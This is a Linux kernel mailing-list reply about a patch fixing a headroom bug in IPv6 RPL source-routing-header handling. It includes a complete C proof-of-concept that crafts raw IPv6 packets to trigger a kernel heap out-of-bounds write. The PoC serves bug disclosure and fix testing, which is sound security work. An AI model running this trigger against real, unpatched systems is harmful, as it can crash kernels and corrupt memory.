Return-Path: <netdev+bounces-280113-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id aEuCM3Zw52ke8AEAu9opvQ
	(envelope-from <netdev+bounces-280113-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Tue, 21 Apr 2026 14:41:26 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
	by mail.lfdr.de (Postfix) with ESMTPS id C439943AC47
	for <lists+netdev@lfdr.de>; Tue, 21 Apr 2026 14:41:25 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id 23A3A300442F
	for <lists+netdev@lfdr.de>; Tue, 21 Apr 2026 12:38:15 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id DDBCF3CD8D6;
	Tue, 21 Apr 2026 12:38:13 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="IE3v4FNI"
X-Original-To: netdev@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B8ECD3C73CC;
	Tue, 21 Apr 2026 12:38:13 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776775093; cv=none; b=sRKfhUxGQPUwNmqobIfRo/nUofiPFxXKAJuR342V7qc6zs7q5ovHleiYVkGlocu4yOyhXndcMbcHlsSPWK3kOQQ+ckDiipP+Zk8Uu5iDzbJ8fET09vkAqiYlo3YzFKfrgObHWBgjuaok3Tm6v0g837D4PQVTIPShCOS7Iy0rmsA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776775093; c=relaxed/simple;
	bh=TAok73CPq60Hqjp4ac2Ge7T0A+IJIsApqRCE8X+Exzs=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=SSMHXe0Kk+7p4ZS58pOjDpZD2RJQavsI9SE3WuMWCcT6J9xnJpfhiSNOy19WHc3QMjWW6WUUvo5jJ1iLB9fqB+1GbzUcy5DdPHMQnjWN8VpL+l4w7m0SXx+vhiG1aALS8CMuhfe8XjXK13/DvnIxS1hZhhJb4r0ELmWaKtBTdZY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=IE3v4FNI; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 0CDD9C2BCB0;
	Tue, 21 Apr 2026 12:38:12 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
	s=korg; t=1776775093;
	bh=TAok73CPq60Hqjp4ac2Ge7T0A+IJIsApqRCE8X+Exzs=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=IE3v4FNIbNGROcrZCUEuefZVUjUJvBCM7z4jBjhNXYx5x4MotXk0R607oQa5gLBK+
	 dqFAyBS8S3qH9ThRJA/LnjefEJ7rycLGmL83zkIK4p8UWjviYCN79zWuztHMqdxEN1
	 gjgbR6/l5dqI13i/QZ2/79G3w+mfv/DesjYOgVv8=
Date: Tue, 21 Apr 2026 14:38:11 +0200
From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
To: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org, "David S. Miller" <davem@davemloft.net>,
	David Ahern <dsahern@kernel.org>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>, stable <stable@kernel.org>
Subject: Re: [PATCH net v2] ipv6: rpl: reserve mac_len headroom when
 recompressed SRH grows
Message-ID: <2026042107-unlawful-sixfold-5f15@gregkh>
References: <2026042158-sediment-elliptic-a954@gregkh>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <2026042158-sediment-elliptic-a954@gregkh>
X-Spamd-Result: default: False [2.34 / 15.00];
	MID_END_EQ_FROM_USER_PART(4.00)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[linuxfoundation.org,none];
	R_DKIM_ALLOW(-0.20)[linuxfoundation.org:s=korg];
	R_SPF_ALLOW(-0.20)[+ip4:104.64.211.4:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FROM_HAS_DN(0.00)[];
	TAGGED_FROM(0.00)[bounces-280113-lists,netdev=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[linuxfoundation.org:+];
	ASN(0.00)[asn:63949, ipnet:104.64.192.0/19, country:SG];
	MISSING_XM_UA(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[gregkh@linuxfoundation.org,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[9];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	TO_DN_SOME(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sin.lore.kernel.org:helo,sin.lore.kernel.org:rdns,davemloft.net:email,linuxfoundation.org:dkim,linuxfoundation.org:email]
X-Rspamd-Queue-Id: C439943AC47
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Tue, Apr 21, 2026 at 02:32:59PM +0200, Greg Kroah-Hartman wrote:
> ipv6_rpl_srh_rcv() decompresses an RFC 6554 Source Routing Header, swaps
> the next segment into ipv6_hdr->daddr, recompresses, then pulls the old
> header and pushes the new one plus the IPv6 header back.  The
> recompressed header can be larger than the received one when the swap
> reduces the common-prefix length the segments share with daddr (CmprI=0,
> CmprE>0, seg[0][0] != daddr[0] gives the maximum +8 bytes).
> 
> pskb_expand_head() was gated on segments_left == 0, so on earlier
> segments the push consumed unchecked headroom.  Once skb_push() leaves
> fewer than skb->mac_len bytes in front of data,
> skb_mac_header_rebuild()'s call to:
> 
> 	skb_set_mac_header(skb, -skb->mac_len);
> 
> will store (data - head) - mac_len into the u16 mac_header field, which
> wraps to ~65530, and the following memmove() writes mac_len bytes ~64KiB
> past skb->head.
> 
> A single AF_INET6/SOCK_RAW/IPV6_HDRINCL packet over lo with a two
> segment type-3 SRH (CmprI=0, CmprE=15) reaches headroom 8 after one
> pass; KASAN reports a 14-byte OOB write in ipv6_rthdr_rcv.
> 
> Fix this by expanding the head whenever the remaining room is less than
> the push size plus mac_len, and request that much extra so the rebuilt
> MAC header fits afterwards.
> 
> Fixes: 8610c7c6e3bd ("net: ipv6: add support for rpl sr exthdr")
> Cc: "David S. Miller" <davem@davemloft.net>
> Cc: David Ahern <dsahern@kernel.org>
> Cc: Eric Dumazet <edumazet@google.com>
> Cc: Jakub Kicinski <kuba@kernel.org>
> Cc: Paolo Abeni <pabeni@redhat.com>
> Cc: Simon Horman <horms@kernel.org>
> Cc: stable <stable@kernel.org>
> Reported-by: Anthropic
> Assisted-by: gkh_clanker_t1000
> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
> ---
> v2: - fixed up if statement to actually work properly, and test it against
>       a working poc (poc will be sent separately)

Poc is here, requires root to run so it's just a normal bug.

------------------

// SPDX-License-Identifier: GPL-2.0
/*
 * PoC for ANT-2026-03771: slab-out-of-bounds write of size 14 in
 * net/ipv6/exthdrs.c:ipv6_rpl_srh_rcv().
 *
 * Mechanism
 * ---------
 * ipv6_rpl_srh_rcv() decompresses an RFC 6554 RPL Source Routing
 * Header, swaps daddr <-> segment[i], recompresses, then:
 *
 *	skb_pull(skb, (hdr->hdrlen+1)<<3);          // old SRH len
 *	if (!hdr->segments_left)                    // ONLY on last seg
 *		pskb_expand_head(...);
 *	skb_push(skb, (chdr->hdrlen+1)<<3 + 40);    // new SRH + ip6hdr
 *	skb_reset_network_header(skb);
 *	skb_mac_header_rebuild(skb);
 *
 * If the recompressed header (chdr) is larger than the received one
 * (hdr) and segments_left > 0, the push consumes headroom that nothing
 * checked.  When the post-push headroom drops below skb->mac_len (14),
 * skb_mac_header_rebuild()'s
 *
 *	skb_set_mac_header(skb, -skb->mac_len);
 *
 * computes (data - head) + (u16)(-14) and stores it in the u16
 * mac_header field, then memmove()s 14 bytes to skb->head + 65522..65535.
 *
 * Triggering growth on the first iteration
 * ----------------------------------------
 * Send cmpri=0 cmpre=15 with two segments and daddr = c0de::1:
 *	seg[0] (16 bytes, cmpri=0): 4141:...:4141   (anything with byte0 != 0xc0)
 *	seg[1] (1 byte, cmpre=15): 0x01 -> decompressed = c0de::1
 *
 * After the swap (i=0) the new daddr is 4141::4141 and the segment list
 * is [c0de::1, c0de::1].  Recompression against 4141::4141 yields
 * cmpri'=0 (4141.. vs c0de..) and cmpre'=0 (4141.. vs c0de..), so the
 * last segment now needs 16 bytes instead of 1.  hdrlen goes from 3 to
 * 4: the SRH grows by 8 bytes.
 *
 * Headroom on entry to the SRH handler via lo:
 *	rawv6_send_hdrinc:	skb_reserve(LL_RESERVED_SPACE(lo)) = 16
 *	neigh_connected_output:	skb_push(14)      -> headroom = 2
 *	loopback_xmit:		eth_type_trans pull(14) -> headroom = 16
 *	ip6_protocol_deliver_rcu: pskb_pull(40)   -> headroom = 56
 *	ipv6_rpl_srh_rcv:	pull(32) push(40+40) -> headroom = 8
 *
 * 8 < 14, so mac_header wraps.  skb data buffer is a ~512-byte slab
 * object; head + 65530 is far past it.
 *
 * Build with CONFIG_KASAN to get a clean splat; without KASAN the
 * 14-byte write lands in unrelated heap memory and the failure mode
 * is less deterministic (often skb_under_panic on a later iteration).
 *
 * Usage
 * -----
 * Run as root.  The PoC configures the local address and sysctls
 * itself so an init=/poc initramfs is sufficient.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <linux/if.h>
#include <linux/in6.h>
#include <linux/ipv6.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/reboot.h>

#define LOCAL_ADDR	"c0de::1"

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static int write_file(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0)
		return -1;
	if (write(fd, val, strlen(val)) < 0) {
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static void bring_up_lo(void)
{
	int fd;
	struct ifreq ifr = { .ifr_name = "lo" };

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket AF_INET");
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		die("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		die("SIOCSIFFLAGS lo");
	close(fd);
}

static void add_local_addr(void)
{
	struct in6_ifreq ifr6;
	struct ifreq ifr = { .ifr_name = "lo" };
	int fd;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket AF_INET6");

	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX lo");

	memset(&ifr6, 0, sizeof(ifr6));
	inet_pton(AF_INET6, LOCAL_ADDR, &ifr6.ifr6_addr);
	ifr6.ifr6_prefixlen = 128;
	ifr6.ifr6_ifindex = ifr.ifr_ifindex;

	if (ioctl(fd, SIOCSIFADDR, &ifr6) < 0 && errno != EEXIST)
		die("SIOCSIFADDR " LOCAL_ADDR);
	close(fd);
}

/*
 * RFC 6554 SRH wire layout (network byte order):
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  | Next Header   |  Hdr Ext Len  | Routing Type=3| Segments Left |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  | CmprI | CmprE |  Pad  |             Reserved                  |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                       Addresses[1..n] ...
 */
static size_t build_packet(unsigned char *buf, size_t buflen, size_t pad)
{
	struct ip6_hdr *ip6 = (struct ip6_hdr *)buf;
	unsigned char *srh = buf + sizeof(*ip6);
	const size_t srh_len = 32;	/* (hdrlen 3 + 1) * 8 */
	const size_t total = sizeof(*ip6) + srh_len + pad;

	if (buflen < total)
		die("buffer too small");
	memset(buf, 0, total);

	/* IPv6 header */
	ip6->ip6_flow	= htonl(6u << 28);
	ip6->ip6_plen	= htons(srh_len + pad);
	ip6->ip6_nxt	= 43;		/* Routing Header */
	ip6->ip6_hops	= 64;
	inet_pton(AF_INET6, "::1",      &ip6->ip6_src);
	inet_pton(AF_INET6, LOCAL_ADDR, &ip6->ip6_dst);

	/* RPL SRH fixed part */
	srh[0] = 59;			/* No Next Header */
	srh[1] = 3;			/* hdrlen: (3+1)*8 = 32 */
	srh[2] = 3;			/* IPV6_SRCRT_TYPE_3 (RPL) */
	srh[3] = 2;			/* segments_left = n+1 = 2 */
	srh[4] = (0 << 4) | 15;		/* CmprI=0, CmprE=15 */
	srh[5] = (7 << 4) | 0;		/* Pad=7, Reserved=0 */
	srh[6] = 0;
	srh[7] = 0;

	/*
	 * seg[0]: full 16 bytes (cmpri=0).  byte[0] != 0xc0 so that
	 * after the swap the new daddr shares no prefix with the
	 * remaining segments and cmpre' collapses from 15 to 0.
	 */
	memset(&srh[8], 0x41, 16);

	/*
	 * seg[1]: 1 byte (cmpre=15).  Decompressed = daddr[0..14] || 0x01
	 * = c0de::1, which is local so the loop check passes.
	 */
	srh[24] = 0x01;

	/* srh[25..31] already zero: 7 bytes of pad */

	return total;
}

int main(void)
{
	static unsigned char pkt[65536];
	struct sockaddr_in6 dst = { .sin6_family = AF_INET6 };
	int fd, on = 1;
	size_t len;

	if (getpid() == 1) {
		mkdir("/proc", 0555);
		mount("proc", "/proc", "proc", 0, NULL);
		mkdir("/sys", 0555);
		mount("sysfs", "/sys", "sysfs", 0, NULL);
	}

	bring_up_lo();
	add_local_addr();

	if (write_file("/proc/sys/net/ipv6/conf/all/rpl_seg_enabled", "1") < 0)
		fprintf(stderr, "warning: cannot enable rpl_seg_enabled (all)\n");
	if (write_file("/proc/sys/net/ipv6/conf/lo/rpl_seg_enabled", "1") < 0)
		fprintf(stderr, "warning: cannot enable rpl_seg_enabled (lo)\n");

	/* let DAD settle so c0de::1 is usable */
	sleep(2);

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0)
		die("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
	if (setsockopt(fd, IPPROTO_IPV6, IPV6_HDRINCL, &on, sizeof(on)) < 0)
		die("setsockopt IPV6_HDRINCL");

	inet_pton(AF_INET6, LOCAL_ADDR, &dst.sin6_addr);

	printf("[*] sending IPv6+RPL-SRH packets to %s\n", LOCAL_ADDR);
	printf("[*] cmpri=0 cmpre=15 n=1: chdr grows by 8 -> headroom 8 -> mac_header wraps\n");
	fflush(stdout);

	/*
	 * The 14-byte write lands at skb->head + ~65530.  Whether KASAN
	 * sees it depends on what that page holds.  Sweep packet sizes so
	 * the data buffer cycles through every kmalloc bucket and the
	 * page allocator; one of the resulting head values will sit 64KiB
	 * below a poisoned page.
	 */
	for (size_t pad = 0; pad <= 32768; pad = pad ? pad * 2 : 64) {
		for (int i = 0; i < 64; i++) {
			len = build_packet(pkt, sizeof(pkt), pad + i);
			if (sendto(fd, pkt, len, 0,
				   (struct sockaddr *)&dst, sizeof(dst)) < 0)
				die("sendto");
		}
	}

	/* softirq processing happens asynchronously */
	sleep(1);

	printf("[!] kernel survived — fix is applied or KASAN is off\n");

	if (getpid() == 1) {
		sync();
		reboot(RB_POWER_OFF);
		pause();
	}
	return 0;
}

